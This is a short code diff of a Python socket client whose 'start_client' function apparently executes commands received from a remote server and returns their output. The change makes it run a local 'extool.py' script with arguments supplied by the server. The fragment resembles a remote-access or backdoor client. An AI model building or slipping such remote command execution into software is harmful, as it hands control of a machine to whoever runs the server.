@@ -35,9 +35,9 @@ def start_client(server_ip, server_port):
                     client.send(output)
                     continue
 
-            if command.lower() == "opencmd":
+            if command.lower().startswith("extool "):
                 try:
-                    result = subprocess.check_output(['python', os.path.join(os.path.dirname(__file__), 'tools', 'opencmd.py')], universal_newlines=True)
+                    result = subprocess.check_output(['python', os.path.join(os.path.dirname(__file__), 'tools', 'extool.py')] + command.split()[1:], universal_newlines=True)
                     client.send(result.encode())
                 except Exception as e:
                     client.send(f"Error: {str(e)}".encode())
